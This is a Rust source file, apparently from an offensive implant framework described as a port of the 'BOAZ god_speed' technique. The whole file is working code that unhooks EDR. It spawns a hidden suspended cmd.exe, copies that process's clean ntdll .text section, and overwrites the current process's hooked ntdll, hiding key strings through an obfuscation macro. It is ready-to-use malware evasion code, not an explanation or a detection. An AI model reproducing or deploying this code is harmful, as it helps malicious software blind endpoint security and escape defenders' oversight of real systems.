//! ntdll unhooking via a clean suspended process (BOAZ god_speed port).
//!
//! Creates a suspended `cmd.exe`, reads its clean ntdll .text section,
//! and overwrites the potentially hooked in-memory ntdll in the current
//! process. The suspended process is then terminated.

use core::ffi::c_void;
use core::mem::zeroed;
use core::ptr::null_mut;

use crate::types::{
    CREATE_NO_WINDOW, CREATE_SUSPENDED, PAGE_EXECUTE_READWRITE, PROCESS_INFORMATION, STARTUPINFOA,
};
use malefic_os_win::kit::binding::{
    MCloseHandle, MCreateProcessA, MGetCurrentProcess, MLoadLibraryA, MNtFlushInstructionCache,
    MReadProcessMemory, MTerminateProcess, MVirtualProtect,
};

/// Read a `u16` from a byte slice at `offset` (little-endian).
unsafe fn read_u16(base: *const u8, offset: usize) -> u16 {
    let ptr = base.add(offset) as *const u16;
    core::ptr::read_unaligned(ptr)
}

/// Read a `u32` from a byte slice at `offset` (little-endian).
unsafe fn read_u32(base: *const u8, offset: usize) -> u32 {
    let ptr = base.add(offset) as *const u32;
    core::ptr::read_unaligned(ptr)
}

/// Locate the `.text` section bounds inside a PE image already mapped at `base`.
/// Returns (virtual_address, raw_size).
unsafe fn find_text_section(base: *const u8) -> Option<(usize, usize)> {
    let e_lfanew = read_u32(base, 0x3C) as usize;
    let nt = base.add(e_lfanew);
    let num_sections = read_u16(nt, 6) as usize;
    let opt_hdr_size = read_u16(nt, 20) as usize;
    let sec_table = nt.add(24 + opt_hdr_size);

    for i in 0..num_sections {
        let sec = sec_table.add(i * 40);
        let name = core::slice::from_raw_parts(sec, 8);
        if name.starts_with(b".text") {
            let virt_addr = read_u32(sec, 12) as usize;
            let size = read_u32(sec, 16) as usize;
            return Some((virt_addr, size));
        }
    }
    None
}

/// Unhook ntdll by:
/// 1. Spawning a suspended `cmd.exe` (its ntdll will be clean).
/// 2. Finding ntdll in the remote process memory (same VA as local).
/// 3. Reading the clean `.text` section via `ReadProcessMemory`.
/// 4. Overwriting our own ntdll `.text` section with the clean bytes.
/// 5. Terminating the suspended process.
pub fn execute_process_operations() {
    unsafe {
        // ── 1. Spawn suspended cmd.exe ───────────────────────────────
        let app = obf_cstr!(b"cmd.exe\0");
        let mut si: STARTUPINFOA = zeroed();
        si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
        let mut pi: PROCESS_INFORMATION = zeroed();

        let ok = MCreateProcessA(
            null_mut(),
            app.as_ptr() as *mut i8,
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            null_mut(),
            null_mut(),
            &mut si as *mut STARTUPINFOA as *mut c_void,
            &mut pi as *mut PROCESS_INFORMATION as *mut c_void,
        );
        if !ok {
            return;
        }

        // ── 2. Get local ntdll base (same VA in the remote process) ──
        let ntdll_base = {
            let _obf_ntdll_dll = obf_cstr!(b"ntdll.dll\0");
            let h = MLoadLibraryA(_obf_ntdll_dll.as_ptr());
            if h.is_null() {
                MTerminateProcess(pi.hProcess, 0);
                return;
            }
            h as *const u8
        };

        // ── 3. Locate .text section ───────────────────────────────────
        let (text_rva, text_size) = match find_text_section(ntdll_base) {
            Some(t) => t,
            None => {
                MTerminateProcess(pi.hProcess, 0);
                return;
            }
        };
        let remote_text = (ntdll_base as usize + text_rva) as *mut c_void;

        // ── 4. Read clean bytes from the suspended process ────────────
        let mut clean_buf = vec![0u8; text_size];
        let ok = MReadProcessMemory(
            pi.hProcess,
            remote_text,
            clean_buf.as_mut_ptr() as *mut c_void,
            text_size,
        );
        if !ok {
            MTerminateProcess(pi.hProcess, 0);
            return;
        }

        // ── 5. Overwrite local ntdll .text with clean bytes ───────────
        let local_text = (ntdll_base as usize + text_rva) as *mut c_void;
        let mut old_prot: u32 = 0;
        if MVirtualProtect(local_text, text_size, PAGE_EXECUTE_READWRITE, &mut old_prot) {
            core::ptr::copy_nonoverlapping(clean_buf.as_ptr(), local_text as *mut u8, text_size);
            MVirtualProtect(local_text, text_size, old_prot, &mut old_prot);
            MNtFlushInstructionCache(MGetCurrentProcess(), local_text, text_size);
        }

        // ── 6. Terminate suspended process ───────────────────────────
        MTerminateProcess(pi.hProcess, 0);
        MCloseHandle(pi.hProcess);
        MCloseHandle(pi.hThread);
    }
}
